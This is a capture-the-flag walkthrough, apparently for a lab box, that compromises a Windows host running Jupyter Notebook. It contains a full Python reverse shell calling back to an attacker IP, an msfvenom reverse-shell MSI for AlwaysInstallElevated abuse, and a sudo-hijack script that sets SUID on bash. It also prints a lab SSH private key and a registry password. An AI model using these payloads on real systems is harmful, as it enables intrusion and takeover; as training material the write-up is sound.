### IP
`10.10.111.30`

# Reconnaissance

`nmap -sC -sV 10.10.111.30`
```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 2b17d88a1e8c99bc5bf53d0a5eff5e5e (RSA)
|   256 3cc0fdb5c157ab75ac8110aee298120d (ECDSA)
|_  256 e9f030bee6cfeffe2d1421a0ac457b70 (ED25519)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-05-20T10:14:27+00:00; -2s from scanner time.
| ssl-cert: Subject: commonName=DEV-DATASCI-JUP
| Not valid before: 2023-03-12T11:46:50
|_Not valid after:  2023-09-11T11:46:50
| rdp-ntlm-info: 
|   Target_Name: DEV-DATASCI-JUP
|   NetBIOS_Domain_Name: DEV-DATASCI-JUP
|   NetBIOS_Computer_Name: DEV-DATASCI-JUP
|   DNS_Domain_Name: DEV-DATASCI-JUP
|   DNS_Computer_Name: DEV-DATASCI-JUP
|   Product_Version: 10.0.17763
|_  System_Time: 2023-05-20T10:14:20+00:00
8888/tcp open  http          Tornado httpd 6.0.3
| http-title: Jupyter Notebook
|_Requested resource was /login?next=%2Ftree%3F
|_http-server-header: TornadoServer/6.0.3
| http-robots.txt: 1 disallowed entry 
|_/ 
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_clock-skew: mean: -2s, deviation: 0s, median: -2s
| smb2-time: 
|   date: 2023-05-20T10:14:22
|_  start_date: N/A
```

We have a web server on port 8888 that runs jupyter notebooks.
	The token here is randomly generated (or at least unknown to us) upon start
	If we can find this token, we may be able to execute commands

### smb

We can try to check if smb allows for null or anonymous authentication:

**Null:**

`cme smb 10.10.111.30 -u '' -p ''`

This gives us an access denied

**Anonymous:**

`cme smb 10.10.111.30 -u 'a' -p ''`

This allows us to log in

We can now try doing some enumeration:

`cme smb 10.10.111.30 -u 'a' -p '' --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol`

```
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [*] Windows 10.0 Build 17763 x64 (name:DEV-DATASCI-JUP) (domain:DEV-DATASCI-JUP) (signing:False) (SMBv1:False)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [+] DEV-DATASCI-JUP\a: 
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [+] Enumerated shares
SMB         10.10.111.30    445    DEV-DATASCI-JUP  Share           Permissions     Remark
SMB         10.10.111.30    445    DEV-DATASCI-JUP  -----           -----------     ------
SMB         10.10.111.30    445    DEV-DATASCI-JUP  ADMIN$                          Remote Admin
SMB         10.10.111.30    445    DEV-DATASCI-JUP  C$                              Default share
SMB         10.10.111.30    445    DEV-DATASCI-JUP  datasci-team    READ,WRITE      
SMB         10.10.111.30    445    DEV-DATASCI-JUP  IPC$            READ            Remote IPC
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [+] Enumerated sessions
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [+] Enumerated loggedon users
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [-] Error enumerating domain users using dc ip 10.10.111.30: socket connection error while opening: [Errno 111] Connection refused
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [*] Trying with SAMRPC protocol
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [-] Error enumerating domain group using dc ip 10.10.111.30: socket connection error while opening: [Errno 111] Connection refused
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [-] Error enumerating local groups of 10.10.111.30: socket connection error while opening: [Errno 111] Connection refused
SMB         10.10.111.30    445    DEV-DATASCI-JUP  [+] Brute forcing RIDs
SMB         10.10.111.30    445    DEV-DATASCI-JUP  500: DEV-DATASCI-JUP\Administrator (SidTypeUser)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  501: DEV-DATASCI-JUP\Guest (SidTypeUser)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  503: DEV-DATASCI-JUP\DefaultAccount (SidTypeUser)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  504: DEV-DATASCI-JUP\WDAGUtilityAccount (SidTypeUser)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  513: DEV-DATASCI-JUP\None (SidTypeGroup)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  1000: DEV-DATASCI-JUP\dev-datasci-lowpriv (SidTypeUser)
SMB         10.10.111.30    445    DEV-DATASCI-JUP  1001: DEV-DATASCI-JUP\sshd (SidTypeUser)
```

We got some really useful information:

We have a list of some users:
```
Administrator
Guest
DefaultAccount
WDAGUtilityAccount
None
dev-datasci-lowpriv
sshd
```

```
Share           Permissions     Remark
-----           -----------     ------
ADMIN$                          Remote Admin
C$                              Default share
datasci-team    READ,WRITE      
IPC$            READ            Remote IPC
```
We can read and write to the `datasci-team` share

We can also read `IPC$`

We can access the share with `smbclient -N //10.10.111.30/datasci-team`
	In here, we find the jupyter notebooks token in `misc/jupyter-token.txt`

`067470c5ddsadc54153ghfjd817d15b5d5f5341e56b0dsad78a`

# Exploitation

### RCE

This isn't exactly a vulnerability in itself, but we can add a new python3 notebook and get it to execute code for us. 

I got a revshell from [revshells.com](revshells.com)

```python
import os,socket,subprocess,threading;
def s2p(s, p):
    while True:
        data = s.recv(1024)
        if len(data) > 0:
            p.stdin.write(data)
            p.stdin.flush()

def p2s(s, p):
    while True:
        s.send(p.stdout.read(1))

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.6.0.114",1337))

p=subprocess.Popen(["sh"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)

s2p_thread = threading.Thread(target=s2p, args=[s, p])
s2p_thread.daemon = True
s2p_thread.start()

p2s_thread = threading.Thread(target=p2s, args=[s, p])
p2s_thread.daemon = True
p2s_thread.start()

try:
    p.wait()
except KeyboardInterrupt:
    s.close()
```

We can start our listener with `nc -lvnp 1337` and execute the code.

This gets us a callback:

`uname -a`
```
Linux DEV-DATASCI-JUP 4.4.0-17763-Microsoft #2268-Microsoft Thu Oct 07 16:36:00 PST 2021 x86_64 x86_64 x86_64 GNU/Linux
```

There is an ssh private key in `/home/dev-datasci/dev-datasci-lowpriv_id_ed25519`
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+YwAAAKjQ358n0N+f
JwAAAAtzc2gtZWQyNTUxOQAAACBUoe5ZSezzC65UZhWt4dbvxKor+dNggEhudzK+JSs+Yw
AAAED9OhQumFOiC3a05K+X6h22gQga0sQzmISvJJ2YYfKZWVSh7llJ7PMLrlRmFa3h1u/E
qiv502CASG53Mr4lKz5jAAAAI2Rldi1kYXRhc2NpLWxvd3ByaXZAREVWLURBVEFTQ0ktSl
VQAQI=
-----END OPENSSH PRIVATE KEY-----
```

Because we know there is a user called `dev-datasci-lowpriv`, we can log in with `ssh -i user.priv dev-datasci-lowpriv@10.10.111.30`

We get the user flag in `C:\Users\dev-datasci-lowpriv\Desktop\user.txt`

# Privilege Escalation 

### AlwaysInstallElevated (Method 1)

We can use `PowerUp.ps1` to look for privesc vectors

First, import with `Import-Module .\PowerUp.ps1`

Then run `Invoke-AllChecks`

The last result is as follows:

```
Check         : AlwaysInstallElevated Registry Key
AbuseFunction : Write-UserAddMSI

DefaultDomainName    : DEV-DATASCI-JUP
DefaultUserName      : dev-datasci-lowpriv
DefaultPassword      : wUqnKWqzha*W!PWrPRWi!M8faUn
AltDefaultDomainName : 
AltDefaultUserName   : 
AltDefaultPassword   : 
Check                : Registry Autologons
```

Note that the `AlwaysInstallElevated` registry key is set to true, which means things are automatically installed as admin.

PowerUp has an abuse function written for this already, but we can't run it because their msi uses a gui to add a user to the admin group.

We do have the password for the machine now, as it was stored in plain text in the registry, but we can't RDP in as a result of the user not being in the rdp group. 

Thus, we can instead generate our own malicious msi to get us a reverse shell.

I did this with `msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.6.0.114 LPORT=443 -f msi -o evil.msi`

We can start a listener with `sudo nc -lnvp 443` and run this on the machine with `msiexec /quiet /qn /i evil.msi` ([source](https://medium.com/@anastasisvasileiadis/windows-privilege-escalation-alwaysinstallelevated-641e660b54bd))

Unfortunately, this doesn't seem to get us a callback. 

After a lot of searching, I found [and old writeup](https://decoder.cloud/2017/02/21/the-system-challenge/) that explains how to look at the error log for msiexec and explains that an interactive user session is needed.

Thus, we can run `ps` and migrate to a process with a session id of 1 or higher.

From here, re-running the exploit works and we get a callback as `nt authority\system`

### WSL Mounting (Method 2)

On the linux machine, we can run the following:

`sudo -l`
```
Matching Defaults entries for dev-datasci on DEV-DATASCI-JUP:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dev-datasci may run the following commands on DEV-DATASCI-JUP:
    (ALL : ALL) ALL
    (ALL) NOPASSWD: /home/dev-datasci/.local/bin/jupyter, /bin/su dev-datasci
        -c *

```

`/home/dev-datasci/.local/bin/jupyter` doesn't exist, so we can make it ourselves

We can make the file ourselves and make it give bash suid perms:

```bash
#!/bin/bash
chmod +s /bin/bash
```

We can then run `sudo ./jupyter -p` to get a shell with euid 0.

To switch to a pure root account, we can run the [following](https://unix.stackexchange.com/questions/645075/attempting-to-get-root-uid-from-root-euid):

```bash
perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
```

Notice that there is a file `/etc/wsl.conf`, which indicates that we are in wsl.

We can [mount the C drive](https://www.public-health.uiowa.edu/it/support/kb48568/) with `mount -t drvfs C: /mnt/c`

From here, we can access `root.txt` in `C:\Users\Administrator\Desktop`
